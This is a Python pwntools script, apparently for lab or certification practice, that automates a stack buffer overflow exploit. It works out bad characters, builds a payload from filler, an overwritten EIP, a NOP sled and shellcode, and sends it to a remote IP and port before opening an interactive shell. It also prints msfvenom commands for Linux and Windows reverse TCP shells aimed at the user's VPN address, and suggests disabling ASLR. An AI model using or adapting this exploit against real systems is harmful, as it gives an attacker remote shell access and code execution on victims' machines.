#!/bin/python3

# Federico Madotto - github.com/fmadotto



from pwn import *

########################### EDIT THESE VARIABLES (START) ###########################

OUTPUT_FILE_NAME = "exploit.txt"
REMOTE_IP = "192.168.217.52"
REMOTE_PORT = 5000

EIP_OFFSET = 0

# in edb, use the OpcodeSearcher plugin with jump equivalent ESP->EIP to find a suitable address
DESIRED_EIP_ADDRESS = 0x5e9a515e

# PASTE SHELLCODE HERE
SHELLCODE =  b""

########################### EDIT THESE VARIABLES (END) #############################



# characters from 0x00 to 0xff (except 0x00, 0x0a, and 0x0d)
ALL_CHARS  = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f"
ALL_CHARS += b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
ALL_CHARS += b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
ALL_CHARS += b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
ALL_CHARS += b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
ALL_CHARS += b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
ALL_CHARS += b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
ALL_CHARS += b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
ALL_CHARS += b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
ALL_CHARS += b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
ALL_CHARS += b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
ALL_CHARS += b"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
ALL_CHARS += b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
ALL_CHARS += b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
ALL_CHARS += b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
ALL_CHARS += b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"



# BAD_CHARS = b"\x00\x0a\x0d"
BAD_CHARS = b"\x00\x0a\x0d"

def write_to_binary_file(filename, payload):
  # Write the payload to a file, replacing its previous content
  with open(filename, "wb") as f:
    f.write(payload)
    f.close()

def read_from_binary_file(filename):
  # Read the payload from a file
  with open(filename, "rb") as f:
    payload = f.read()
    f.close()
    return payload

def write_expected_bytes(filename, payload):
  # For each byte in payload, write the ASCII representation of the byte to a file, one per line
  with open(filename, "w") as f:
    for byte in payload:
      # Write the byte as a string of length 2, with leading zeros, and add a newline
      f.write("{:02x}\n".format(byte))
    f.close()


def prepare_payload(offset, desired_eip, shellcode):
  FILLER = b"\x41" * offset
  desired_eip = p32(desired_eip)
  NOP_SLED = b"\x90" * 16

  payload = FILLER + desired_eip + NOP_SLED + shellcode
  payload += b"\x0a"

  # Save the payload to a file
  write_to_binary_file(OUTPUT_FILE_NAME, payload)

  return payload

def find_bad_chars():
  payload = prepare_payload(EIP_OFFSET, DESIRED_EIP_ADDRESS, ALL_CHARS)
  # Save the expected bytes to a file (for debugging the bad chars)
  write_expected_bytes("expected_bytes.txt", payload)

def compare_loaded_bytes_with_expected_bytes(loaded_bytes_file, expected_bytes_file):
  # Read the loaded chars from a file
  with open(loaded_bytes_file, "r") as f:
    loaded_bytes = f.read()
    f.close()

  # Read the expected chars from a file
  with open(expected_bytes_file, "r") as f:
    expected_bytes = f.read()
    f.close()

  # Update the global variable BAD_CHARS with the lines of expected_bytes_file that are not in loaded_bytes_file
  global BAD_CHARS
  # For each line in expected_bytes_file
  for expected_byte in expected_bytes.splitlines():
    # If the line is not in loaded_bytes_file and it's not 0a (newline)
    if expected_byte not in loaded_bytes and expected_byte != "0a":
      # Add the line to BAD_CHARS
      BAD_CHARS += bytes.fromhex(expected_byte)

  # Return the list of bad chars
  return BAD_CHARS


def remote_exploit(ip, port):
  # read content of exploit.txt as binary (need to execute the local exploit first)
  payload = read_from_binary_file(OUTPUT_FILE_NAME)
  
  # Connect to the remote server
  p = remote(ip, port)
  # Send the payload
  p.sendline(payload)
  # Start an interactive shell
  p.interactive()

def main():
  # If SHELLCODE is empty
  if not SHELLCODE:
    
    # Find the bad chars
    print("Preparing the payload to find the bad chars...")
    find_bad_chars()
    print("Payload prepared. Check in the debugger which characters have been loaded and save them to a file called loaded_bytes.txt (one per line)")
    # Wait for any input before starting the comparison
    input("Press any key to start the comparison...")

    # Compare the loaded chars with the expected chars
    bad_chars = compare_loaded_bytes_with_expected_bytes("loaded_bytes.txt", "expected_bytes.txt")

    # Get ip of tun0 interface
    ip = subprocess.check_output("ip addr show tun0 | grep -Po 'inet \K[\d.]+'", shell=True).decode("utf-8").strip()

    # print bad_chars as string of hex values with this format: \x00\x0a\x0d
    print("\nLinux shellcode:")
    print("msfvenom -p linux/x86/shell_reverse_tcp LHOST={} LPORT=443 -b \"\\x{}\" -f py -v SHELLCODE\n".format(ip, "\\x".join("{:02x}".format(x) for x in bad_chars)))
    print("Windows shellcode:")
    print("msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT=443 -b \"\\x{}\" -f py -v SHELLCODE\n\n".format(ip, "\\x".join("{:02x}".format(x) for x in bad_chars)))
    
    print("Next steps:")
    print("1. Generate the shellcode and update the global variable SHELLCODE with the generated code.")
    print("2. Update the global variable DESIRED_EIP_ADDRESS with the address of the instruction you want to execute. Might need to disable aslr with \"echo 0 | sudo tee /proc/sys/kernel/randomize_va_space\"")
    print("3. Run the script again.")

  elif DESIRED_EIP_ADDRESS:
    # Prepare the payload
    print("Preparing the payload...")
    payload = prepare_payload(EIP_OFFSET, DESIRED_EIP_ADDRESS, SHELLCODE)
    write_to_binary_file(OUTPUT_FILE_NAME, payload)
    print("Payload saved to exploit.txt")

    remote_exploit(ip=REMOTE_IP, port=REMOTE_PORT)

if __name__ == "__main__":
  main()